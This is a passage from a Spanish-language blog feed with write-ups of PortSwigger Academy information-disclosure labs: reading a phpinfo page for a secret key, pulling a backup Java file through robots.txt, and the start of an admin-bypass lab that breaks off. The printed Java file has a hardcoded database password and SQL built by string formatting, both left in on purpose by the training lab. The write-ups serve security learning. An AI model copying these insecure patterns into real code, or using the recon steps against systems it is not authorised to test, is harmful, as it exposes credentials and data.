        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/head.png" alt="Featured image of post Portswigger Academy Learning Path: Information Disclosure Lab 2" /&gt;&lt;h1 id=&#34;lab-information-disclosure-on-debug-page&#34;&gt;Lab: Information disclosure on debug page&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder mostrar en la aplicacion informacion de la infraestructura, software o algo que revele informacion del sistema. Esta vulnerabilidad mas conocida como &lt;code&gt;Information Disclosure&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo primero que tenemos es una aplicacion que muestra articulos y en el podemos ver detalles, lo que hay que obtener es la SECRET_KEY que esta en las variables de entorno, lo que nos hace recordar que la manera de ver esto es posible en HP desde un archivo en phpinfo.&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Lo que vamos a hacer es la manera de buscar el phpinfo, ingresamos directamente a &lt;code&gt;phpinfo.php&lt;/code&gt; pero no existe, por lo que podemos buscar comentarios o en el codigo fuente.&lt;/p&gt;
&lt;h3 id=&#34;buscar-la-url&#34;&gt;Buscar la URL&lt;/h3&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 488; 
			flex-basis: 1171px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/comentario.png&#34; data-size=&#34;1211x248&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/comentario.png&#34;
			width=&#34;1211&#34;
			height=&#34;248&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/comentario_hu03fd4895e9b6056c58bde97faa071452_51908_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/comentario_hu03fd4895e9b6056c58bde97faa071452_51908_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Comentarios en el codigo&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Comentarios en el codigo&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;O a traves de las herramientas de burpsuite&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Vamos a Target &amp;gt; Site map&lt;/li&gt;
&lt;li&gt;Damos clic derecho en el sitio web&lt;/li&gt;
&lt;li&gt;Engagement Tools &amp;gt; Find Comments&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Y se lista a continuacion los codigos: Information&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 262; 
			flex-basis: 629px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/burpcomment.png&#34; data-size=&#34;968x369&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/burpcomment.png&#34;
			width=&#34;968&#34;
			height=&#34;369&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/burpcomment_hub0274be67798476ae707cd71ca2bf76c_30366_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/burpcomment_hub0274be67798476ae707cd71ca2bf76c_30366_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Comentarios con funcion de burpsuite&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Comentarios con funcion de burpsuite&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;buscar-la-secret-key&#34;&gt;Buscar la secret key&lt;/h3&gt;
&lt;p&gt;Ahora accedemos al archivo:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 255; 
			flex-basis: 613px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/phpinfo.png&#34; data-size=&#34;1607x629&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/phpinfo.png&#34;
			width=&#34;1607&#34;
			height=&#34;629&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/phpinfo_hu64f774c641deb338e2bafcbac39bc6b6_165741_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/phpinfo_hu64f774c641deb338e2bafcbac39bc6b6_165741_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;PHPINFO archivo&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;PHPINFO archivo&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y buscando encontramos la key:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 384; 
			flex-basis: 923px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/key.png&#34; data-size=&#34;1431x372&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/key.png&#34;
			width=&#34;1431&#34;
			height=&#34;372&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/key_hu192b812aced57641fae98f30bf5bbe5f_53645_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/key_hu192b812aced57641fae98f30bf5bbe5f_53645_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Secret key en phpinfo.php&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Secret key en phpinfo.php&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y ahora ingresamos la solucion y resolvimos el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 234; 
			flex-basis: 562px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/resuelto.png&#34; data-size=&#34;1787x763&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/resuelto.png&#34;
			width=&#34;1787&#34;
			height=&#34;763&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/resuelto_hu3edf3f6caa26df627c0d9153704ec7f5_330309_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-2/resuelto_hu3edf3f6caa26df627c0d9153704ec7f5_330309_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Information Disclosure Lab 3</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/</link>
        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/head.png" alt="Featured image of post Portswigger Academy Learning Path: Information Disclosure Lab 3" /&gt;&lt;h1 id=&#34;lab-source-code-disclosure-via-backup-files&#34;&gt;Lab: Source code disclosure via backup files&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder mostrar en la aplicacion informacion de la infraestructura, software o algo que revele informacion del sistema. Esta vulnerabilidad mas conocida como &lt;code&gt;Information Disclosure&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo primero que tenemos es una aplicacion que muestra articulos pero lo que debemos hacer es una archivo de backups que nos pueda dar la contrasena que necesitamos.&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Buscamos entre el codigo fuente no encontramos nada y entre los comentarios, asi que buscamos otra manera, y en la ruta de &lt;code&gt;/robots.txt&lt;/code&gt; podemos ver si encontramos algo.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 462; 
			flex-basis: 1110px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/robots.png&#34; data-size=&#34;657x142&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/robots.png&#34;
			width=&#34;657&#34;
			height=&#34;142&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/robots_hud77612498e757243c608aac36926e23f_12938_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/robots_hud77612498e757243c608aac36926e23f_12938_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Contenido del archivo robots.txt&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Contenido del archivo robots.txt&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora listamos lo que encontramos en ese archivo robots&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 283; 
			flex-basis: 679px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/directory.png&#34; data-size=&#34;626x221&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/directory.png&#34;
			width=&#34;626&#34;
			height=&#34;221&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/directory_hufbd3b1405b037f02ccb5286cf81b7206_20816_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/directory_hufbd3b1405b037f02ccb5286cf81b7206_20816_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Contenido del directorio backup&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Contenido del directorio backup&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y podemos ver que tiene un archivo de backup que podemos visualizar, lo abrimos y nos lista a continuacion el codigo y encontramos la contrasena de postgresql&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kn&#34;&gt;package&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;data.productcatalog&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;common.db.ConnectionBuilder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.IOException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.ObjectInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.Serializable&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.sql.Connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.sql.ResultSet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.sql.SQLException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.sql.Statement&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;ProductTemplate&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Serializable&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1L&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;transient&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Product&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;product&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;ProductTemplate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IOException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ClassNotFoundException&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;inputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;defaultReadObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;

        &lt;span class=&#34;n&#34;&gt;ConnectionBuilder&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;connectionBuilder&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ConnectionBuilder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
                &lt;span class=&#34;s&#34;&gt;&amp;#34;org.postgresql.Driver&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;
                &lt;span class=&#34;s&#34;&gt;&amp;#34;postgresql&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;
                &lt;span class=&#34;s&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;5432&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;
                &lt;span class=&#34;s&#34;&gt;&amp;#34;postgres&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;
                &lt;span class=&#34;s&#34;&gt;&amp;#34;postgres&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;
                &lt;span class=&#34;s&#34;&gt;&amp;#34;zkzsf7azhrcee4r127holbxpwkaq8f3g&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;withAutoCommit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;Connection&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;connect&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;connectionBuilder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;SELECT * FROM products WHERE id = &amp;#39;%s&amp;#39; LIMIT 1&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;Statement&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;statement&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;createStatement&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;ResultSet&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resultSet&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;statement&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;executeQuery&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;resultSet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;
            &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;product&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Product&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;resultSet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SQLException&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IOException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Product&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getProduct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;product&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Y ahora ingresamos la solucion y resolvimos el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 211; 
			flex-basis: 508px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/resuelto.png&#34; data-size=&#34;1795x847&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/resuelto.png&#34;
			width=&#34;1795&#34;
			height=&#34;847&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/resuelto_hu2d520a614d839c425859cbf2b5d3aaa8_464114_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-3/resuelto_hu2d520a614d839c425859cbf2b5d3aaa8_464114_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Information Disclosure Lab 4</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/</link>
        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/head.png" alt="Featured image of post Portswigger Academy Learning Path: Information Disclosure Lab 4" /&gt;&lt;h1 id=&#34;lab-authentication-bypass-via-information-disclosure&#34;&gt;Lab: Authentication bypass via information disclosure&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder mostrar en la aplicacion informacion de la infraestructura, software o algo que revele informacion del sistema. Esta vulnerabilidad mas conocida como &lt;code&gt;Information Disclosure&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo primero que tenemos es que la aplicacion nos da unas credenciales de &lt;code&gt;wiener:peter&lt;/code&gt; con la cual podemos acceder al sistema y realizar otras funciones. Pero cuando queremos acceder al portal de administracion que esta en la ruta &lt;code&gt;/admin&lt;/code&gt; muestra el siguiente error&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Admin interface only available to local users&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 530; 
			flex-basis: 1273px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/requisito.png&#34; data-size=&#34;1767x333&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-4/requisito.png&#34;
